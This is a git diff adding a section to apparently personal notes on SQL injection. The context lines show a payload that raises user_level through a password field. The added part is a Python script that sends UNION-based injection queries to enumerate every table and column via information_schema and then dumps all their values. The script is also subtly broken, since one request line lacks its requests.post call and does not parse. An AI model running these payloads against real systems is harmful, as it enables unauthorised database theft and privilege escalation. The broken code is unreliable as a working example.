@@ -124,3 +124,30 @@ If we set $passwd to `badPwd'), user_level='103', user_aim=('????????` it will u
 
 ## Second order SQL injection attack
 [YT video](https://youtu.be/FNTwAV4xH3o)
+
+## Getting all fields from database
+Suppose you don't know the database structure. And you want to dump all the entries from database. You can do it so if you find malicious select. Just this code that will firstly find all tables in database and secondly will find all possible columns. After that it will perform simple bruteforce, checking all possible tables with all possible columns.
+
+```python
+url = ""
+resp = requests.post(url,
+                    data = {
+                        "q": "' UNION select group_concat(table_name) from information_schema.tables where table_schema=database() #"
+                    })
+databases = json.loads(resp.text)["data"]["users"][0].split(',')
+resp = requests.post(url,
+                data = {
+                    "q": "' UNION select group_concat(column_name) from information_schema.columns where table_schema=database() #"
+                })
+column_names = json.loads(resp.text)["data"]["users"][0].split(',')
+dump = []
+for database in databases:
+    for column in column_names:
+        resp = url,
+        data = {
+            "q": "' UNION select group_concat(" + column + ") from " + database + " #"
+        })
+        resp = json.loads(resp.text)
+        if (resp["status"] == "success"):
+            dump.extend(resp["data"]["users"][0].split(','))
+```
